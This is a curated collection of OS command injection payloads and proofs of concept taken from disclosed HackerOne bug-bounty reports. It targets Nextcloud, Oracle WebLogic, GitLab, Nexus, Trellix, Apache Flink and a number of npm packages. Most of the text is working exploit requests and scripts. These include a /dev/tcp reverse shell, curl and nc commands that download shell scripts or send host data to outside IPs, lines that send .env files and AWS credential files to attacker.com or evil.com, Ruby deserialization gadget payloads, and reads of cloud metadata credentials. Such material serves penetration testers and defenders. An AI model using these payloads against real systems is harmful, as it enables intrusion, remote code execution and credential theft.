# OS Command Injection  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#546753](https://hackerone.com/reports/546753)  -  Remote Code Execution via Extract App Plugin
*high*

```http
POST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1
Host: demo.nextcloud.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 98
Cookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lb…

nameOfFile=sample.rar"|curl http://138.68.1.244/shell.pl -o /tmp/shell2.pl|"&directory=&external=0
```

## 2. [#546753](https://hackerone.com/reports/546753)  -  Remote Code Execution via Extract App Plugin
*high*

```http
POST /lun0shai/index.php/apps/extract/ajax/extractRar.php HTTP/1.1
Host: demo.nextcloud.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 66
Cookie: oco9fwvj7vid=aashsh75p508m9qk0tdq0ahk8v; oc_sessionPassphrase=XmIYyFzOLH1JtcvmdyZ6JbO67Sh1lb…

nameOfFile=sample.rar"|perl /tmp/shell2.pl|"&directory=&external=0
```

## 3. [#810778](https://hackerone.com/reports/810778)  -  Remote OS Command Execution on Oracle Weblogic server via [CVE-2017-3506]
*critical*

```http
POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1
Host: raebilling.mtn.co.za
Content-Type: text/xml
Content-Type: text/xml;charset=UTF-8
Content-Length: 873

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
        <void index="2">
                  <string>ping `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
```

## 4. [#733072](https://hackerone.com/reports/733072)  -  Path traversal, to RCE
*high, $12,000*

```bash
curl -H "Private-Token: $(cat token)" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
```

## 5. [#506646](https://hackerone.com/reports/506646)  -  Webshell via File Upload on ecjobs.starbucks.com.cn
*critical*

```bash
curl -i -s -k  -X $'GET' \
    -H $'Host: ecjobs.starbucks.com.cn' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \
    $'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\\TrustHX\\STBKSERM101\\www_app%20%2fd%2fs%2fb'
```

## 6. [#810755](https://hackerone.com/reports/810755)  -  Remote OS Command Execution on Oracle Weblogic server via [CVE-2017-10271]
*critical*

```http
POST /wls-wsat/RegistrationPortTypeRPC HTTP/1.1
Host: raebilling.mtn.co.za
Content-Length: 426
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java class="java.beans.XMLDecoder">
        <object class="java.lang.Thread" method="sleep">
          <long>40000</long>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
```

## 7. [#810755](https://hackerone.com/reports/810755)  -  Remote OS Command Execution on Oracle Weblogic server via [CVE-2017-10271]
*critical*

```http
POST /wls-wsat/RegistrationPortTypeRPC HTTP/1.1
Host: raebilling.mtn.co.za
Content-Length: 426
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
```

## 8. [#654888](https://hackerone.com/reports/654888)  -  OS Command Injection in Nexus Repository Manager 2.x
*critical*

```http
PUT /nexus/service/siesta/capabilities/000013ea3743a556 HTTP/1.1
Host: HOST:PORT
Authorization: Basic YWRtaW46YWRtaW4xMjM=
Content-Type: application/xml
Content-Length: 333

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ns2:capability xmlns:ns2="http://sonatype.org/xsd/nexus-capabilities-plugin/rest/1.0"><id>healthcheck</id><notes>123</notes><enabled>true</enabled><typeId>1</typeId><properties><key>createrepoPath</key><value>C:\Windows\System32\calc.exe</value></properties></ns2:capability>
```

## 9. [#654888](https://hackerone.com/reports/654888)  -  OS Command Injection in Nexus Repository Manager 2.x
*critical*

```http
PUT /nexus/service/siesta/capabilities/000013ea3743a556 HTTP/1.1
Host: HOST:PORT
Authorization: Basic YWRtaW46YWRtaW4xMjM=
Content-Type: application/xml
Content-Length: 333

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
```

## 10. [#810778](https://hackerone.com/reports/810778)  -  Remote OS Command Execution on Oracle Weblogic server via [CVE-2017-3506]
*critical*

```http
POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1
Host: raebilling.mtn.co.za
Content-Type: text/xml
Content-Type: text/xml;charset=UTF-8
Content-Length: 873

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
```

## 11. [#410334](https://hackerone.com/reports/410334)  -  Reflected XSS and Blind out of band command injection at subdomain dstuid-ww.dst.ibm.com
*high*

```http
POST /cgi-bin/PasswordCreate.pl HTTP/1.1
Host: dstuid-ww.dst.ibm.com
Content-Length: 39
Content-Type: application/x-www-form-urlencoded
Referer: https://dstuid-ww.dst.ibm.com/PasswordCreate.html

email=-------------------------&ibm-submit=Submit
```

## 12. [#1418891](https://hackerone.com/reports/1418891)  -  Apache Flink RCE via GET jar/plan API Endpoint
*critical, $6,000*

```http
GET /jars/145df7ff-c71a-4f3a-b77a-ee4055b1bede_a.jar/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load("https://fs.bugbounty.jarijaas.fi/aiven-flink/shell-loader.js")&parallelism=1 HTTP/1.1
Host: ████
Authorization: Basic █████
```

## 13. [#331032](https://hackerone.com/reports/331032)  -  [buttle] Remote Command Execution via unsanitized PHP filename when it's run with --php-bin flag
*critical*

```bash
$ curl -v --path-as-is http://localhost:8080/test.php;whoami;uname -a;pwd;echo "uh oh, RCE :P"
```

## 14. [#682442](https://hackerone.com/reports/682442)  -  Git flag injection - Search API with scope 'blobs'
*high, $7,000*

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index

[{"basename":null,"data":"VERSION\u00001\u0000Gitaly, version 1.53.2\n","filename":null,"id":null,"ref":"--no-index","startline":0,"project_id":4},{"basename":null,"data":"config.toml\u00001\u0000# Gitaly configuration file\nconfig.toml\u00002\u0000# This file is managed by gitlab-ctl. Manual changes will be\nconfig.toml\u00003\u0000# erased! To change the contents below, edit /etc/gitlab/gitlab.rb\nconfig.toml\u00004\u0000# and run:\nconfig.toml\u00005\u0000# sudo gitlab-ctl reconfigure\nconfig.toml\u00006\u0000\nconfig.toml\u00007\u0000socket_path = '/var/opt/gitlab/gitaly/gitaly.socket'\nconfig.toml\u00008\u0000bin_dir = '/opt/gitlab/embedded/bin'\nconfig.toml\u00009\u0000\n","filename":null,"id":null,"ref":"--no-index","startline":0,"project_id":4}]
```

## 15. [#2309291](https://hackerone.com/reports/2309291)  -  CVE-2023-41763 Business Elevation of Privilege vulnerability on [.mtn.com]
*high*

```http
GET /lwa/Webpages/LwaClient.aspx?meeturl=aHR0cDovL2NtZDRjdm5laTU2Z3U5ZXRnMjIwb3AxaGI3ZWV3eDZjdS5vYXN0LmZ1bi8/aWQ9TE1OJTI1ezEzMzcqMTMzN30jLnh4Ly8= HTTP/1.1
Host: fec-feweb-ext.mtn.com
```

## 16. [#315773](https://hackerone.com/reports/315773)  -  Remote Command Execution vulnerability in pullit
*critical*

```
diff --git a/src/index.js b/src/index.js
index 3a34831..9bffd0d 100644
--- a/src/index.js
+++ b/src/index.js
@@ -1,7 +1,7 @@
 const GitHubApi = require('github');
 const Menu = require('terminal-menu');
 const {
-  execSync
+  execFileSync
 } = require('child_process');
 const parse = require('parse-github-repo-url');
 
@@ -12,7 +12,7 @@ class Pullit {
   }
 
   init() {
-    const url = execSync(`git config --get remote.origin.url`, {
+    const url = execFileSync('git', ['config', '--get', 'remote.origin.url'], {
       encoding: 'utf8'
     }).trim();
 
@@ -34,8 +34,11 @@ class Pullit {
       })
       .then(res => {
         const branch = res.data.head.ref;
-        execSync(
-          `git fetch origin pull/${id}/head:${branch} && git checkout ${branch}`
+        execFileSync(
+          'git', ['fetch', 'origin', `pull/${id}/head:${branch}`]
+        );
+        execFileSync(
+          'git', ['checkout', branch]
         );
       })
       .catch(err => {
```

## 17. [#2817658](https://hackerone.com/reports/2817658)  -  Unauthenticated Path Traversal and Command Injection in Trellix Enterprise Security Manager 11.6.10
*critical*

```http
POST /rs/..;/Snowservice/SnowflexAdminServices/CreateNode HTTP/1.0
Host: [ESM IP]
Content-Type: application/json
Content-Length: 118

{
    "serverName": "test132", 
    "ip": "127.0.0.1",
    "port": "1212",
    "peerPort": "1210"
}
```

## 18. [#2817658](https://hackerone.com/reports/2817658)  -  Unauthenticated Path Traversal and Command Injection in Trellix Enterprise Security Manager 11.6.10
*critical*

```http
POST /rs/..;/Snowservice/SnowflexAdminServices/ManageNode HTTP/1.0
Host: [ESM IP]
Content-Type: application/json
Content-Length: 186

{
    "serverName": "test132",
    "processes": [
        {
            "name": "`bash -i >& /dev/tcp/[Attacker IP]/2137 0>&1`", 
            "signal": "Restart"
        }
    ]
}
```

## 19. [#2817658](https://hackerone.com/reports/2817658)  -  Unauthenticated Path Traversal and Command Injection in Trellix Enterprise Security Manager 11.6.10
*critical*

```http
POST /rs/..;/Snowservice/SnowflexAdminServices/CreateNode HTTP/1.0
Host: [ESM IP]
Content-Type: application/json
Content-Length: 118

{
```

## 20. [#2817658](https://hackerone.com/reports/2817658)  -  Unauthenticated Path Traversal and Command Injection in Trellix Enterprise Security Manager 11.6.10
*critical*

```http
POST /rs/..;/Snowservice/SnowflexAdminServices/ManageNode HTTP/1.0
Host: [ESM IP]
Content-Type: application/json
Content-Length: 186

{
```

## 21. [#1609965](https://hackerone.com/reports/1609965)  -  RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)
*critical, $33,510*

```ruby
def size_validator
        @size_validator ||= DecompressedArchiveSizeValidator.new(archive_path: @archive_file)
      end
```

## 22. [#658013](https://hackerone.com/reports/658013)  -  Git flag injection - local file overwrite to remote code execution
*critical, $12,000*

```
`curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'`
```

## 23. [#1672388](https://hackerone.com/reports/1672388)  -  RCE via github import
*critical*

```
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'| (hostname; ps aux)  | nc 51.75.74.52 11211  \').read\"],"queue\":\"system_hook_push\"}"
```

## 24. [#1672388](https://hackerone.com/reports/1672388)  -  RCE via github import
*critical*

```
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps aux) | curl 51.75.74.52:11211 -X POST --data-binary @-  ')\"], \"queue\":\"system_hook_push\"}"
```

## 25. [#1672388](https://hackerone.com/reports/1672388)  -  RCE via github import
*critical*

```
\r\n*3\r\n$3\r\nset\r\n$39\r\ncache:gitlab:avatar:yvvdwf/xss:16210710\r\n$347\r\n\u0004\b[\bc\u0015Gem::SpecFetcherc\u0013Gem::InstallerU:\u0015Gem::Requirement[\u0006o:\u001cGem::Package::TarReader\u0006:\b@ioo:\u0014Net::BufferedIO\u0007;\u0007o:#Gem::Package::TarReader::Entry\u0007:\n@readi\u0000:\f@headerI\"\u0006a\u0006:\u0006ET:\u0012@debug_outputo:\u0016Net::WriteAdapter\u0007:\f@socketo:\u0014Gem::RequestSet\u0007:\n@setso;\u000e\u0007;\u000fm\u000bKernel:\u000f@method_id:\u000bsystem:\r@git_setI\".(hostname; ps aux) | nc 51.75.74.52 11211\u0006;\fT;\u0012:\fresolve\r\n\r\n
```

## 26. [#865168](https://hackerone.com/reports/865168)  -  [xps] Command Injection via insecure command concatenation
*critical*

```javascript
// https://github.com/robotlolita/xps/blob/master/lib/linux.js#L48
...
var shell = require('./utils').shell;
... 
exports.kill = kill;
function kill(pid) {
  return shell('kill', ['-9', pid]).map(K(undefined));  // <-- user's input
}

// --------------------------------------------------
// https://github.com/robotlolita/xps/blob/master/lib/utils.js#L26
...
var exec    = require('child_process').exec;
...
var escapeArg = JSON.stringify;
...
exports.shell = shell;
function shell(cmd, args) {
  var command = cmd + ' ' + args.map(unary(compose(escapeArg)(String))).join(' '); // <-- injection
  return new Task(function(reject, resolve) {
    exec(command, function(error, stdout, stderr) {
      if (error)  reject(error);
      else        resolve({ output: stdout, error: stderr });
    });
  });
}
```

## 27. [#2705661](https://hackerone.com/reports/2705661)  -  CVE-2024-45498: Apache Airflow Command injection in read_dataset_event_from_classic DAG
*low*

```http
POST /api/v1/datasets/events HTTP/1.1
Host: 192.168.168.129:8080
Referer: http://192.168.168.129:8080/datasets?uri=s3%3A%2F%2Foutput%2F1.txt
Cookie: session=<authen-cookie>
Content-Type: application/json
Content-Length: 62

{"dataset_uri":"s3://output/1.txt","extra":{"hi":" '$(gnome-calculator)' "}}
```

## 28. [#546753](https://hackerone.com/reports/546753)  -  Remote Code Execution via Extract App Plugin
*high*

```
nameOfFile=sample.rar"|curl www.attacker.com:443/data?id=$(id | base64)|"&directory=&external=0
```

## 29. [#3637898](https://hackerone.com/reports/3637898)  -  OS Command Injection in `aws-cdk-lib` NodejsFunction via Unsanitized `OsCommand` Helper (Supply Chain RCE)
*high*

```json
{
  "name": "@company/analytics-helper",
  "version": "2.1.0",
  "dependencies": {
    "lodash": "4.17.21' && curl https://attacker.com/exfil?d=$(cat /asset-input/.env|base64) && echo '"
  }
}
```

## 30. [#422944](https://hackerone.com/reports/422944)  -  H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products
*medium*

```sh
sh-4.2$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

██████████

sh-4.2$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/████████
                
{
  "Code" : "Success",
  "LastUpdated" : "2018-10-12T11:39:10Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "█████████",
  "SecretAccessKey" : "█████████",
  "Token" : "██████████",
  "Expiration" : "2018-10-12T18:09:12Z"
}
```

## 31. [#630227](https://hackerone.com/reports/630227)  -  Command Injection due to lack of sanitisation of tar.gz filename passed as an argument to pm2.install()  function
*medium*

```javascript
// pm2_exploit.js

'use strict'
const pm2 = require('pm2')

// payload - user controllable input
const payload = "foo.tar.gz;touch here;echo whoami>here;chmod +x here;./here>whoamreallyare"

pm2.connect(function(err) {
    if (err) {
        console.error(err)
        process.exit(2)
    }

    pm2.start({

    }, (err, apps) => {
        pm2.install(payload, {}) // injection
        pm2.disconnect()
        if (err) {
            throw err
        }
    })
})
```

## 32. [#633364](https://hackerone.com/reports/633364)  -  Command Injection in npm module name passed as an argument to pm2.install() function
*medium*

```javascript
// pm2_exploit.js


'use strict'
const pm2 = require('pm2')

// payload - user controllable input
const payload = "test;pwd;whoami;uname -a;ls -l ~/playground/Node;"

pm2.connect(function (err) {
    if (err) {
        console.error(err)
        process.exit(2)
    }

    pm2.start({
        script: 'app.js' // fake app.js to supress "No script path - aborting" error thrown from PM2
    }, (err, apps) => {
        pm2.install(payload, {}) // injection
        pm2.disconnect()
        if (err) {
            throw err
        }
    })
})
```

## 33. [#1672388](https://hackerone.com/reports/1672388)  -  RCE via github import
*critical*

```ruby
def build_command(args)
        command = [nil]

        args.each do |i|
          if i.is_a? Array
            i.each do |j|
              j = j.to_s
              command << "$#{j.bytesize}"
              command << j
            end
          else
            i = i.to_s
            command << "$#{i.bytesize}"
            command << i
          end
        end
```

## 34. [#863544](https://hackerone.com/reports/863544)  -  [devcert] Command Injection via insecure command formatting
*critical*

```javascript
// https://github.com/davewasmer/devcert/blob/master/src/utils.ts#L12
import { execSync, ExecSyncOptions } from 'child_process';
import tmp from 'tmp';
import createDebug from 'debug';
import path from 'path';
import sudoPrompt from 'sudo-prompt';

import { configPath } from './constants';

const debug = createDebug('devcert:util');

export function openssl(cmd: string) {
  return run(`openssl ${ cmd }`, {  // <-- the command executed is: openssl genrsa -out "/home/ubuntu/.config/devcert/domains/";touch HACKED;"/private-key.key" 2048
    stdio: 'pipe',
    env: Object.assign({
      RANDFILE: path.join(configPath('.rnd'))
    }, process.env)
  });
}

export function run(cmd: string, options: ExecSyncOptions = {}) {
  debug(`exec: \`${ cmd }\``);
  return execSync(cmd, options);  // <-- call child_process.execSync 
}
...
```

## 35. [#319476](https://hackerone.com/reports/319476)  -  `whereis` concatenates unsanitized input into exec() command
*critical*

```js
var whereis = require('whereis');
var filename = 'wget; touch /tmp/tada';
whereis(filename, function(err, path) {
  console.log(path);
});
```

## 36. [#858674](https://hackerone.com/reports/858674)  -  [wireguard-wrapper] Command Injection via insecure command concatenation
*critical*

```javascript
// https://github.com/rostwolke/node-wireguard-wrapper/blob/master/src/command/Wg.js#L58
'use strict';
const {exec} = require('child_process');
...
	static showconf(device){
		return new Promise(function(resolve, reject){
			if(!device){
				return reject('No device/interface specified');
			}

			exec(`wg showconf ${device}`, function(error, stdout, stderr){
				if(error){
					return reject(`Exec error: ${error}`);
				}
				if(stderr){
					return reject(`StdErr: ${stderr}`);
				}
    ....
```

## 37. [#319467](https://hackerone.com/reports/319467)  -  `macaddress` concatenates unsanitized input into exec() command
*critical*

```js
let iface = '../../../etc/passwd; touch /tmp/poof; echo ';
require('macaddress').one(iface, function (err, mac) {
  console.log("Mac address for this host: %s", mac);  
});
```

## 38. [#973386](https://hackerone.com/reports/973386)  -  [curling] Remote Code Execution
*critical*

```javascript
const curling = require('curling');

curling.run('file:///etc/passwd -o ./index.js', function(d, payload){console.log(payload)});
```

## 39. [#511459](https://hackerone.com/reports/511459)  -  [listening-processes] Command Injection
*critical*

```bash
$ node
> const processes = require('listening-processes')
> processes(`'Python && whoami >> hh;'`)
/bin/sh: \s.*:[0-9]* (LISTEN): command not found
{ Python:
   [ { command: 'Python',
       pid: '14720',
       port: '8000',
       invokingCommand:
        '/usr/local/Cellar/python/3.7.0/Frameworks/Python.framework/Versions/3.7/Resources/Python.app/Contents/MacOS/Python -m http.server' } ] }
```

## 40. [#3558713](https://hackerone.com/reports/3558713)  -  Command Injection via Unsanitized Bundling Options in `aws-cdk-lib/aws-lambda-nodejs`
*high*

```typescript
// Published as "convenient-lambda" on npm
import { NodejsFunction } from 'aws-cdk-lib/aws-lambda-nodejs';

export class ConvenientLambda extends NodejsFunction {
  constructor(scope, id, props) {
    super(scope, id, {
      ...props,
      bundling: {
        ...props.bundling,
        externalModules: [
          ...(props.bundling?.externalModules ?? []),
          // Attacker payload hidden among legitimate-looking externals
          'lodash & curl https://evil.com/exfil?data=$(cat ~/.aws/credentials | base64)',
        ],
      },
    });
  }
}
```

## 41. [#410334](https://hackerone.com/reports/410334)  -  Reflected XSS and Blind out of band command injection at subdomain dstuid-ww.dst.ibm.com
*high*

```http
GET /cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submit HTTP/1.1
Host: dstuid-ww.dst.ibm.com
```

## 42. [#864777](https://hackerone.com/reports/864777)  -  [vboxmanage.js] Command Injection via insecure command concatenation
*critical*

```javascript
// https://github.com/danielgindi/node-vboxmanage/blob/master/index.js#L76
...
var
    child_process = require('child_process'),
...
VBoxManage.manage = function (command, options) {

    command = command || [];
    if (!(command instanceof Array)) {
        command = [command];
    }

    options = options || {};

    for (var i = 0; i < command.length; i++) {
        command[i] = escapeArg(command[i]);
    }

    Object.keys(options).forEach(function (option) {

        command.push('--' + option);
        var value = options[option];

        if (value !== true) {
            command.push(escapeArg(value));
        }

    });

    if (VBoxManage.debug) {
        console.warn("$ VBoxManage " + command.join(" "));
    }

    return new Promise(function (resolve, reject) {

        child_process.exec(vBoxManageBinary + ' ' + command.join(' '), {}, function (err, stdout, stderr) {  // <-- injection

            if (err) {
                err.stderr = stderr;
                return reject(err);
# … truncated …
```

## 43. [#951249](https://hackerone.com/reports/951249)  -  [freespace] Command Injection due to Lack of Sanitization
*medium*

```javascript
exports.check = function(driveOrMount, callback) {
    return new Promise(function(resolve, reject) {
        let cb = function(err, stdout, stderr) { ... };
        if (!driveOrMountRegex.test(driveOrMount)) {
            let err = new Error(DRIVE_STRING_ERROR);
            if (callback) callback(err);
            return reject(err);
        }
        if (process.platform === 'win32') {
            driveOrMount = driveOrMount.charAt(0).toLowerCase();
            cp.exec(`fsutil volume diskfree ${driveOrMount}:`, {}, cb);
        } else {
            cp.exec(`df -P ${driveOrMount} | awk 'NR==2 {print $4}'`, {}, cb);  // vulnerability - 'driveOrMount' is being used directly without sanitization
        }
    }).then(function(bytes) { return bytes })
        .catch(function(err) { return Promise.reject(err) });
};
```

## 44. [#633364](https://hackerone.com/reports/633364)  -  Command Injection in npm module name passed as an argument to pm2.install() function
*medium*

```javascript
/**
 * PM2 Module System.
 */
Modularizer.install = function (CLI, module_name, opts, cb) {
  if (typeof(opts) == 'function') {
    cb = opts;
    opts = {};
  }

    (...)

  else {
    Common.logMod(`Installing NPM ${module_name} module`);
    NPM.install(CLI, module_name, opts, cb)   //// injection point
  }
};
```

## 45. [#658013](https://hackerone.com/reports/658013)  -  Git flag injection - local file overwrite to remote code execution
*critical, $12,000*

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```

## 46. [#653125](https://hackerone.com/reports/653125)  -  Git flag injection leading to file overwrite and potential remote code execution
*critical, $3,500*

```bash
curl 'http://4290d4225642/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'
```

## 47. [#1672388](https://hackerone.com/reports/1672388)  -  RCE via github import
*critical*

```bash
curl -kv "http://gitlab.example.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "356289002",
    "target_namespace": "YOUR_GITLAB_USERNAME",
    "new_name": "poc-rce",
    "github_hostname": "http://YOUR_IP:YOUR_PORT"
}'
```

## 48. [#1672388](https://hackerone.com/reports/1672388)  -  RCE via github import
*critical*

```bash
curl "http://gitlab.example.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: 3LCvKWXVF-Gadcnbxxxx" \
  --data '{
    "personal_access_token": "xxxxx",
    "repo_id": "356289002",
    "target_namespace": "root",
    "new_name": "NEW-NAME-'$(date +%s)'",
    "github_hostname": "http://ns.yvvdwf.me:80"
}'
```

## 49. [#331032](https://hackerone.com/reports/331032)  -  [buttle] Remote Command Execution via unsanitized PHP filename when it's run with --php-bin flag
*critical*

```
*   Trying ::1...
* Connected to localhost (::1) port 8080 (#0)
> GET /test.php HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Content-Type: text/html
< Date: Thu, 29 Mar 2018 10:35:22 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
* Connection #0 to host localhost left intact
Its working!rafal.janicki
Linux LT0081U2 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
/home/rafal.janicki/playground/hackerone/Node
uh oh, RCE :P
```

## 50. [#925324](https://hackerone.com/reports/925324)  -  [systeminformation] Command Injection via insecure command formatting
*critical*

```bash
curl -I --connect-timeout 5 -m 5 $urlSanitized 2>/dev/null | head -n 1 | cut -d " " -f2 # $urlSanitized is the user input
```

## 51. [#473888](https://hackerone.com/reports/473888)  -  RCE which may occur due to `ActiveSupport::MessageVerifier` or `ActiveSupport::MessageEncryptor` (especially Active storage)
*high, $1,500*

```bash
$ ruby -v
ruby 2.6.0p0 (2018-12-25 revision 66547) [x86_64-darwin16]

$ rails -v
Rails 5.2.2

$ rails new verifier_rce
$ cd verifier_rce/
$ bundle install
```

## 52. [#405694](https://hackerone.com/reports/405694)  -  [apex-publish-static-files] Command Injection on connectString
*critical*

```
;cat /etc/passwd
```

## 53. [#331032](https://hackerone.com/reports/331032)  -  [buttle] Remote Command Execution via unsanitized PHP filename when it's run with --php-bin flag
*critical*

```
;whoami;
```

## 54. [#1679624](https://hackerone.com/reports/1679624)  -  Remote Command Execution via Github import
*critical, $33,510*

```json
[pid  1362] read(67, "*1\r\n$5\r\nmulti\r\n*3\r\n$9\r\nsismember\r\n$53\r\ncache:gitlab:branch_names:root/gh-import-7316:102:set\r\n$3\r\nggg\r\n*3\r\n$3\r\nset\r\n$19\r\nsession:gitlab:jjjj\r\n$330\r\n\4\10[\10c\25Gem::SpecFetcherc\23Gem::InstallerU:\25Gem::Requirement[\6o:\34Gem::Package::TarReader\6:\10@ioo:\24Net::BufferedIO\7;\7o:#Gem::Package::TarReader::Entry\7:\n@readi\0:\f@headerI\"\10aaa\6:\6ET:\22@debug_outputo:\26Net::WriteAdapter\7:\f@socketo:\24Gem::RequestSet\7:\n@setso;\16\7;\17m\vKernel:\17@method_id:\vsystem:\r@git_setI\"\33echo id > /tmp/vakzz22\6;\fT;\22:\fresolve\r\n*2\r\n$6\r\nexists\r\n$53\r\ncache:gitlab:branch_names:root/gh-import-7316:102:set\r\n*1\r\n$4\r\nexec\r\n", 16384) = 570
```

## 55. [#1609965](https://hackerone.com/reports/1609965)  -  RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)
*critical, $33,510*

```ruby
wait_for_archived_file do
          validate_decompressed_archive_size if Feature.enabled?(:validate_import_decompressed_archive_size)
          decompress_archive
        end

      def wait_for_archived_file
        MAX_RETRIES.times do |retry_number|
          break if File.exist?(@archive_file)

          sleep(2**retry_number)
        end

        yield
      end
```

## 56. [#658013](https://hackerone.com/reports/658013)  -  Git flag injection - local file overwrite to remote code execution
*critical, $12,000*

```bash
$ ssh git@gitlab-vm.local -i gitlab
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-70-generic x86_64)
$ id
uid=998(git) gid=998(git) groups=998(git)

$ cat /var/opt/gitlab/.ssh/authorized_keys
commit 00c8e52996654d02bcbdba47dc25ee73671cbfd6
Author: Administrator <admin@example.com>
Date:   Wed Jul 24 12:56:23 2019 +0000

    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxsqkWZobL5DBOnM3rtE7ZDP4d9v0lABJRGJbovHHTNY2iH3x3pjjerPfLDO21Gkyfzn4J+x6O6GleMAB5nxnZRH7E44khfW6Ldql29Rv2Q/IYCsBSKxGT6RCOFusoRi1uHlQmexIh4gZkmPeFfDLTy70Xv3FpPLfKE/EiVOjuEtY9JUC4MVlPHaTzZ2HE4sZT5tvcm9YtSpjT2v0SMR8uCXcKMAx4Tsu/Un2N5UziXgtRF+vD0fRhNyKIkOtULwBgWkL5RE71vYbxOhviqTAld7r70TIWSzSUHcUewbMS5XcEdBwl3XI/9qzo+jOA0Ulf2bkkROpELBoHwfLdpu9p will@MacBook-Pro.local
```

## 57. [#405694](https://hackerone.com/reports/405694)  -  [apex-publish-static-files] Command Injection on connectString
*critical*

```
var publisher = require('apex-publish-static-files');
 
publisher.publish({
connectString: ";cat /etc/passwd ;",
    directory: "public",
    appID: 111
});
```

## 58. [#324491](https://hackerone.com/reports/324491)  -  `fs-path` concatenates unsanitized input into exec()/execSync() commands
*critical*

```js
const fsPath = require('fs-path');
const source = '/bin/ls';
const target =  '/tmp/foo;rm\t/tmp/foo;whoami>\t/tmp/bar';
fsPath.copySync(source, target);
```

